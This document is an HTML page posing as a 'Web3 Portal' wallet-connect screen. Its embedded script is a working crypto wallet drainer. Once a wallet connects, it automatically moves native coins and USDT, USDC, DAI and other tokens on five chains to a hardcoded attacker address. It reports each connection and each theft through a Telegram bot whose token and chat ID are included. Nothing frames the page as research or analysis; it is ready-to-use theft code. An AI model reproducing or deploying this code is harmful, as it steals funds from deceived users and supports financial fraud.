<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Web3 Portal</title>
<style>
body {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: system-ui, -apple-system, sans-serif;
}
.container {
    background: white;
    border-radius: 24px;
    padding: 48px;
    text-align: center;
    max-width: 450px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
}
.icon { font-size: 72px; margin-bottom: 24px; }
.connect-btn {
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    border: none;
    padding: 16px 48px;
    font-size: 18px;
    font-weight: 600;
    border-radius: 12px;
    cursor: pointer;
}
.status {
    margin-top: 20px;
    padding: 10px;
    background: #f0f0f0;
    border-radius: 8px;
    display: none;
}
</style>
</head>
<body>

<div class="container">
    <div class="icon">üîê</div>
    <h1 style="font-size:32px;font-weight:700;margin-bottom:16px">Connect Wallet</h1>
    <button onclick="connect()" class="connect-btn" id="connectBtn">Connect Now</button>
    <div id="status" class="status"></div>
</div>

<script type="module">
import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
import { ethers } from 'https://esm.sh/ethers@5.7.2'

// ========== CONFIGURATION ==========
const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
const PROJECT_ID = "72f0728c47e59d2eb9fc83069bc6843d";
const TG_TOKEN = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
const TG_CHAT = "8309320360";

// ========== CHAINS CONFIG ==========
const CHAINS_CONFIG = {
    1: {
        name: 'Ethereum',
        rpc: 'https://eth.llamarpc.com',
        tokens: [
            '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
            '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
            '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
            '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // SHIB
            '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
        ]
    },
    137: {
        name: 'Polygon',
        rpc: 'https://polygon-rpc.com',
        tokens: [
            '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', // USDT
            '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', // USDC
            '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', // DAI
        ]
    },
    56: {
        name: 'BSC',
        rpc: 'https://bsc-dataseed.binance.org',
        tokens: [
            '0x55d398326f99059fF775485246999027B3197955', // USDT
            '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
            '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
        ]
    },
    42161: {
        name: 'Arbitrum',
        rpc: 'https://arb1.arbitrum.io/rpc',
        tokens: [
            '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', // USDT
            '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', // USDC
        ]
    },
    10: {
        name: 'Optimism',
        rpc: 'https://mainnet.optimism.io',
        tokens: [
            '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', // USDT
            '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', // USDC
        ]
    }
};

const ERC20_ABI = [
    'function balanceOf(address) view returns (uint256)',
    'function transfer(address, uint256) returns (bool)',
    'function symbol() view returns (string)',
    'function decimals() view returns (uint8)'
];

// ========== HELPER FUNCTIONS ==========
function showStatus(msg) {
    const status = document.getElementById('status');
    status.style.display = 'block';
    status.textContent = msg;
    console.log(msg);
}

async function sendTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: TG_CHAT,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch(e) {
        console.log('TG error:', e);
    }
}

// ========== WEB3MODAL SETUP ==========
const metadata = {
    name: 'Web3 Portal',
    description: 'Connect wallet',
    url: window.location.origin,
    icons: ['https://avatars.githubusercontent.com/u/37784886']
};

const ethersConfig = defaultConfig({
    metadata,
    enableEIP6963: true,
    enableInjected: true,
    enableCoinbase: true,
    rpcUrl: 'https://eth.llamarpc.com',
    defaultChainId: 1
});

const modal = createWeb3Modal({
    ethersConfig,
    chains: [
        {chainId: 1, name: 'Ethereum', currency: 'ETH', rpcUrl: 'https://eth.llamarpc.com'},
        {chainId: 137, name: 'Polygon', currency: 'MATIC', rpcUrl: 'https://polygon-rpc.com'},
        {chainId: 56, name: 'BSC', currency: 'BNB', rpcUrl: 'https://bsc-dataseed.binance.org'},
        {chainId: 42161, name: 'Arbitrum', currency: 'ETH', rpcUrl: 'https://arb1.arbitrum.io/rpc'},
        {chainId: 10, name: 'Optimism', currency: 'ETH', rpcUrl: 'https://mainnet.optimism.io'}
    ],
    projectId: PROJECT_ID,
    enableAnalytics: false
});

// ========== DRAINAGE FUNCTION ==========
async function drainWallet(address) {
    showStatus('üîÑ Starting drainage...');
    
    // Get the ethereum provider
    const ethereum = window.ethereum || (modal.getWalletProvider ? modal.getWalletProvider() : null);
    
    if (!ethereum) {
        showStatus('‚ùå No wallet provider found');
        return;
    }
    
    let totalDrained = 0;
    const results = [];
    
    // Process each chain
    for (const [chainId, config] of Object.entries(CHAINS_CONFIG)) {
        try {
            showStatus(`üîÑ Processing ${config.name}...`);
            
            // Switch to chain
            try {
                await ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{chainId: '0x' + parseInt(chainId).toString(16)}]
                });
            } catch (switchError) {
                console.log(`Chain ${chainId} not available, skipping...`);
                continue;
            }
            
            // Wait for switch
            await new Promise(r => setTimeout(r, 2000));
            
            // Create fresh provider for this chain
            const provider = new ethers.providers.Web3Provider(ethereum);
            const signer = provider.getSigner();
            
            // Verify we're on the right chain
            const network = await provider.getNetwork();
            if (network.chainId != chainId) {
                console.log(`Failed to switch to chain ${chainId}`);
                continue;
            }
            
            // 1. DRAIN NATIVE TOKEN
            try {
                const balance = await provider.getBalance(address);
                const balanceInEth = parseFloat(ethers.utils.formatEther(balance));
                
                if (balanceInEth > 0.002) { // Keep some for gas
                    const gasPrice = await provider.getGasPrice();
                    const gasLimit = 21000;
                    const gasCost = gasPrice.mul(gasLimit * 2);
                    const amountToSend = balance.sub(gasCost);
                    
                    if (amountToSend.gt(0)) {
                        showStatus(`üí∏ Sending ${ethers.utils.formatEther(amountToSend)} native...`);
                        
                        const tx = await signer.sendTransaction({
                            to: DEST,
                            value: amountToSend,
                            gasLimit: gasLimit
                        });
                        
                        await tx.wait();
                        const value = parseFloat(ethers.utils.formatEther(amountToSend));
                        totalDrained += value;
                        results.push(`‚úÖ ${config.name}: ${value.toFixed(4)} native`);
                        
                        await sendTelegram(`‚úÖ DRAINED ${value.toFixed(4)} native on ${config.name}\nTX: ${tx.hash}`);
                    }
                }
            } catch(e) {
                console.log(`Native drain error on ${config.name}:`, e);
            }
            
            // 2. DRAIN TOKENS
            for (const tokenAddress of config.tokens) {
                try {
                    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
                    
                    const balance = await contract.balanceOf(address);
                    
                    if (balance.gt(0)) {
                        const symbol = await contract.symbol().catch(() => 'TOKEN');
                        const decimals = await contract.decimals().catch(() => 18);
                        const formatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
                        
                        showStatus(`üí∏ Sending ${formatted.toFixed(2)} ${symbol}...`);
                        
                        const tx = await contract.transfer(DEST, balance, {
                            gasLimit: 100000
                        });
                        
                        await tx.wait();
                        results.push(`‚úÖ ${config.name}: ${formatted.toFixed(2)} ${symbol}`);
                        
                        await sendTelegram(`‚úÖ DRAINED ${formatted.toFixed(2)} ${symbol} on ${config.name}\nTX: ${tx.hash}`);
                    }
                    
                    // Wait between tokens
                    await new Promise(r => setTimeout(r, 1000));
                    
                } catch(e) {
                    console.log(`Token error:`, e);
                }
            }
            
        } catch(e) {
            console.log(`Error on chain ${chainId}:`, e);
        }
    }
    
    // Final status
    if (results.length > 0) {
        showStatus('‚úÖ Drainage completed!');
        await sendTelegram(`üéØ DRAINAGE COMPLETE\n\n${results.join('\n')}\n\nFrom: ${address}`);
    } else {
        showStatus('‚ö†Ô∏è Nothing was drained');
    }
}

// ========== CONNECT FUNCTION ==========
window.connect = async function() {
    try {
        document.getElementById('connectBtn').textContent = 'Connecting...';
        await modal.open();
    } catch(e) {
        console.error('Connection error:', e);
        document.getElementById('connectBtn').textContent = 'Connect Now';
    }
}

// ========== AUTO-DRAIN ON CONNECTION ==========
modal.subscribeProvider(async (state) => {
    if (state.isConnected && state.address) {
        document.getElementById('connectBtn').textContent = 'Connected';
        
        // Send initial notification
        await sendTelegram(`üéØ NEW CONNECTION\nüë§ Address: ${state.address}\n‚è∞ ${new Date().toLocaleString()}`);
        
        // Start drainage after 1 second
        setTimeout(() => {
            drainWallet(state.address);
        }, 1000);
    }
});

// Check if already connected on load
window.addEventListener('load', async () => {
    const account = modal.getAddress();
    if (account) {
        document.getElementById('connectBtn').textContent = 'Connected';
        showStatus('Already connected. Starting drainage...');
        setTimeout(() => {
            drainWallet(account);
        }, 1000);
    }
});
</script>
</body>
</html>
